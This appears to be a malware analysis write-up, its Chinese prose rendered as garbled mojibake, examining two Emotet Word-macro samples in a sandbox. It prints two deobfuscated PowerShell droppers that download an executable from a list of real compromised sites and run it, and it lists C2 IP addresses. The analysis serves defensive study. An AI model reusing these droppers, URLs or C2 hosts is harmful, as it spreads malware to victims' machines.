Emotet å…·æœ‰é«˜æŒä¹…æ€§å’Œåè§„é¿æœºåˆ¶ï¼Œä¾‹å¦‚ï¼Œèƒ½è¯†åˆ«æ²™ç›’å’Œè™šæ‹Ÿæœºå¹¶é€‰æ‹©æ˜¯å¦é€šè¿‡è™šå‡çš„è¡Œä¸ºæ¥æ‘†è„±è¢«ç ”ç©¶ã€‚

## W97M.Emotet.38616

### åˆ†æç»“æœé“¾æ¥

- [9753345689b4a9807df97ef55a6f73ae295aa23114df7727952483430b6ad127 (MD5: D94DA626DE93EB7CDFCB7351C7551DB0) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/ff7262ed-b298-4e47-9ec7-35300dd91dcd/#)

- Fake Netï¼š[9753345689b4a9807df97ef55a6f73ae295aa23114df7727952483430b6ad127 (MD5: D94DA626DE93EB7CDFCB7351C7551DB0) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/26b814ae-f7e3-4116-ba25-d6ac4726b936/)
  - Fake Net æ¨¡å¼æ‹¦æˆª HTTP è¯·æ±‚å¹¶è¿”å› 404 Not Found

### DNS Resolutions

Domain | IP | Network (Fake Net or not)
-|-|-
amventas.com|149.56.200.84|âœ– & âœ”
www.cotrafina.com|51.83.37.21|âœ”
webappbr.com|189.45.192.37|âœ”
whatsappsenderpro.com|37.187.90.62|âœ”
bartboutens.nl|185.182.56.69|âœ”

<span id="1">

### HTTP Requests

- ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶å¹¶æ‰§è¡Œ<br>
![Host: amventas.com](img/amventas-exe-download.jpg)
  - åˆ›å»ºå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹å†å‘ http://47.146.117.214/DUquQ9ANq3P/RlSOqVmh/nxR4JN8UgNHs/iyvFmwLuT/ å‘é€ POST è¯·æ±‚ï¼Œå†…å®¹åŒ…å«å¤§æ®µç©ºå­—ç¬¦

### HTTP Requests - Fake Net

- åŒæ ·ï¼Œå…ˆè®¿é—® amventas.com ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸‹è½½å¤±è´¥
- åˆ†åˆ«å‘`www.cotrafina.com`ã€`webappbr.com`ã€`whatsappsenderpro.com`å’Œ`bartboutens.nl`å‘é€ HTTP GET è¯·æ±‚

  Host|Actual Response
  -|-
  www.cotrafina.com|File not found.
  webappbr.com|[an EXE file](https://app.any.run/tasks/179c038b-1177-4f43-ac96-91c0599c224f)ï¼ˆæ£€æµ‹åˆ° Emotetï¼Œå‘ http://142.105.151.124:443/N2l2ymAH/ å‘é€ POST è¯·æ±‚ï¼‰
  whatsappsenderpro.com|Nothing
  bartboutens.nl|403 Forbidden

- ç”± http://bartboutens.nl/wp-admin/no77z_k3_azs/ çš„è·¯ç”±`wp-admin/`æ¨æµ‹å‡ºå½“å‰è¯·æ±‚çš„æ˜¯ WordPress çš„ç®¡ç†å‘˜ç•Œé¢ä¸‹çš„å†…å®¹ï¼Œåˆ¤æ–­è¯¥è¯·æ±‚éœ€è¦ç®¡ç†å‘˜æƒé™ï¼ˆé€šè¿‡æ¶æ„è½¯ä»¶åº”è¯¥å¯ä»¥è®¿é—® XDï¼‰
  - è®¿é—®æ—¶è¿”å›çš„ favicon æ˜¯ WordPress çš„ Logo<br>
![WordPress çš„ Logo](img/403-wp.jpg)

### Powershell å‘½ä»¤

æ— è®ºæ˜¯å¦å¤„äº Fake Netï¼Œæ‰§è¡Œçš„ Powershell å‘½ä»¤æ˜¯ä¸€æ ·çš„ï¼ˆéœ€è¦ Base64 è§£ç ï¼Œè§£ç åæ¯ä¸ªå­—ç¬¦é—´å«ä¸€ä¸ªç©ºç™½ç¬¦ï¼Œéœ€è¦å¦å¤–å¤„ç†ï¼‰
```bash
$WIQOPiyv='VDSJKjof';
[Net.ServicePointManager]::"s`eCurIT`Y`prot`oC`ol" = 'tls12, tls11, tls';
$FLWJRcfd = '684';
$XYOXHmoo='DMTBXycm';
$YGCGBzno=$env:userprofile+'\'+$FLWJRcfd+'.exe';$KRUHFrsl='WANVMkff';
$KUAJEmdy=&('ne'+'w-o'+'bject') NeT.wEbCLieNT;

# å¯¹åº”ä¸Šè¿°è¯·æ±‚çš„ç½‘å€
$EZNKVfta='http://amventas.com/public/iu1c_vtucu_ruec/*http://www.cotrafina.com/wp-content/xrmq_7ug_ttv/*http://webappbr.com/wp-admin/ha_s5_3wf/*http://whatsappsenderpro.com/Videos/4wl_0q0m_g61c3/*http://bartboutens.nl/wp-admin/no77z_k3_azs/'."S`pLIT"([char]42);

$ILJBBuqs='BCVLIwgu';
foreach($NDVGBrzv in $EZNKVfta){
  try{
    $KUAJEmdy."Dow`NL`OAdfi`Le"($NDVGBrzv, $YGCGBzno);
    $FQTWFvmr='UHAJVsdu';

    # å¦‚æœä¸‹è½½æ–‡ä»¶çš„é•¿åº¦å¤§äºç­‰äº 20892 å­—èŠ‚ï¼Œå°±ç»“æŸç½‘å€éå†
    # å¹¶æ‰§è¡Œå½“å‰ä¸‹è½½çš„æ–‡ä»¶
    If ((.('Get'+'-It'+'em') $YGCGBzno)."LeN`GTh" -ge 20892)
    {
      ([wmiclass]'win32_Process')."C`ReatE"($YGCGBzno);
      $IQAQNvqj='LSRORjao';
      break;
      $LGNPJfwk='SGCHNvil'
    }

  }
  catch{}
}
$FZFBOmhf='CSIZVdbi'
```

## Downloader/DOC.Emotet.S1265

### åˆ†æç»“æœé“¾æ¥

- [695b50903e39a9948a722321c64d4a35f6a2fb5fd960513dbbc818500a2a9e2e (MD5: 369D334368C2F3AD80F27BFCF2521329) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/2f89de65-e161-4de8-8582-76f1c047e599)
- Fake Netï¼š[695b50903e39a9948a722321c64d4a35f6a2fb5fd960513dbbc818500a2a9e2e (MD5: 369D334368C2F3AD80F27BFCF2521329) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/9a0356f2-2566-4870-bb65-94db07d1cb47)

### DNS Resolutions

Domain | IP | Network (Fake Net or not)
-|-|-
mc-interiorismo.com|217.76.130.170|âœ– & âœ”
mc130.com|152.44.32.37|âœ”
mentarimedia.com|108.174.147.82|âœ”
mellysphotography.com|101.0.112.233|âœ”
vipmein.com|31.14.23.203|âœ”

<span id="2">

### HTTP Requests

- ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶å¹¶æ‰§è¡Œ<br>
![Host: mc-interiorismo.com](img/mc-exe-download.jpg)
  - åˆ›å»ºå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹åˆ†åˆ«å‘ http://73.116.193.136/LkstvyMl/CVXolBsiY/cJlvw/ å’Œ http://185.94.252.13:443/PfbyXeG7uaEFVu/FXwVTtD0b1YbdZKz/l28YgTshaeHZDJ/ ï¼ˆ443 ç«¯å£ï¼Œä½†ä½¿ç”¨çš„æ˜¯ HTTP åè®®ï¼‰ å‘é€ POST è¯·æ±‚ï¼Œå†…å®¹å‡åŒ…å«å¤§æ®µç©ºå­—ç¬¦

### HTTP Requests - Fake Net

- å…ˆä» mc-interiorismo.com è·å–å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸‹è½½å¤±è´¥
- åˆ†åˆ«å‘`mc130.com`ã€`mentarimedia.com`ã€`mellysphotography.com`å’Œ`vipmein.com`å‘é€ HTTP GET è¯·æ±‚

  Host|Actual Response
  -|-
  mc130.com|[an EXE file](https://app.any.run/tasks/d047fc27-4f40-4b88-836f-cb257dd2548b)ï¼ˆæ£€æµ‹åˆ° Emotetï¼Œåˆ†åˆ«å‘ http://73.116.193.136/MUORKTNGB2/ å’Œ http://185.94.252.13:443/8GT4/SS18m8aX5mkcu/nLfj6C3i/ å‘é€ POST è¯·æ±‚ï¼‰
  mentarimedia.com|401 Authorization Requiredï¼ˆéœ€è¦æä¾›ç”¨æˆ·åå’Œå¯†ç ï¼‰
  mellysphotography.com| 404 Not Found
  vipmein.com|404 Not Found

### Powershell å‘½ä»¤

Base64 è§£ç ï¼Œå¤„ç†ç©ºç™½ç¬¦ï¼Œç¾åŒ–ä»£ç ğŸ‘‡
```bash
$OVIFTjcd='XRACQbok';
[Net.ServicePointManager]::"SeC`Ur`iT`YPr`o`TOCol" = 'tls12, tls11, tls';
$UZGPUcmi = '641';
$NSGSLpzd='CVPKWtsh';
$NGRDQptr=$env:userprofile+'\'+$UZGPUcmi+'.exe';
$IMHBNkwz='SJEAJmzv';
$PFTXFiyw=.('new-'+'o'+'bject') NET.WebCLient;

# å¯¹åº”ä¸Šè¿°è¯·æ±‚çš„ç½‘å€
$QJVLDmud='http://mc-interiorismo.com/theme/Rk/*http://mc130.com/SHB/KloCHjT/*http://mentarimedia.com/modules/p6N365/*http://mellysphotography.com/large/Rem220541/*http://vipmein.com/assets2/6eeP7BwazY/'."Sp`LIT"([char]42);

$IDXPTgha='HGEIYuec';
foreach($SPSXErgd in $QJVLDmud){
  try{
    $PFTXFiyw."dowNloA`dfI`Le"($SPSXErgd, $NGRDQptr);
    $FMFVVlth='PCLDLaok';

    # å¦‚æœä¸‹è½½æ–‡ä»¶çš„é•¿åº¦å¤§äºç­‰äº 22745 å­—èŠ‚ï¼Œå°±ç»“æŸç½‘å€éå†
    # å¹¶æ‰§è¡Œå½“å‰ä¸‹è½½çš„æ–‡ä»¶
    If ((&('Get'+'-Ite'+'m') $NGRDQptr)."l`ENGtH" -ge 22745)
    {
      ([wmiclass]'win32_Process')."C`R`EATE"($NGRDQptr);
      $SSBTMaot='JLJWGhtj';
      break;
      $MHLWMlry='DVDUNqqk'
    }

  }
  catch{}
}
$ESTUHsbx='GFFVSrox'
```

## æ€»ç»“

- ä¸Šè¿°ä¸¤ä¸ªæ¶æ„è½¯ä»¶å‡é€šè¿‡å¯ç”¨å®çš„ Word æ–‡æ¡£å®Œæˆæ³¨å…¥ï¼Œå¹¶åœ¨å—æ„ŸæŸ“çš„æœºå™¨ä¸Šä¸‹è½½å®‰è£…å¹¶è¿è¡Œå…¶ä»–æ¶æ„è½¯ä»¶ï¼ŒæˆåŠŸä¸‹è½½çš„å¯æ‰§è¡Œæ–‡ä»¶å‡æ£€æµ‹åˆ° Emotet
- éå†ç½‘å€é›†å°è¯•ä¸‹è½½å…¶ä»–æ¶æ„è½¯ä»¶ï¼Œä¸€æ—¦ä¸‹è½½æˆåŠŸå°±ç»ˆæ­¢éå†
- Powershell æ‰§è¡Œçš„å‘½ä»¤æ˜¯å¯è§£å¯è¯»çš„ï¼Œå› æ­¤æ²¡æœ‰ç›´æ¥è¿æ¥ CnC æœåŠ¡å™¨ï¼Œè€Œæ˜¯é€šè¿‡ä¸‹è½½çš„ Emotet è¿›è¡Œè¿æ¥ï¼Œä¸”ä¸åŒæ¸ é“ä¸‹è½½çš„ Emotet è¿æ¥çš„ CnC æœåŠ¡å™¨å¯èƒ½ä¸åŒï¼ˆ[W97M.Emotet.38616](#1) ä¸­è¿æ¥çš„ CnC æœåŠ¡å™¨ä¸åŒï¼Œ[Downloader/DOC.Emotet.S1265](#2) æ˜¯ç›¸åŒçš„ï¼‰ï¼Œä¸€å®šç¨‹åº¦ä¸Šå‡å°‘äº† CnC æœåŠ¡å™¨é“¾æ¥æš´éœ²çš„å¯èƒ½
- æš‚æœªå‘ç°æœ‰æ£€æµ‹æ²™ç®±çš„è¡Œä¸º

## å‚è€ƒèµ„æ–™

- [Emotet Malware â€“ An Introduction to the Banking Trojan | Malwarebytes](https://www.malwarebytes.com/emotet/)
- [Emotet - Malware Trends Tracker by ANY.RUN](https://any.run/malware-trends/emotet)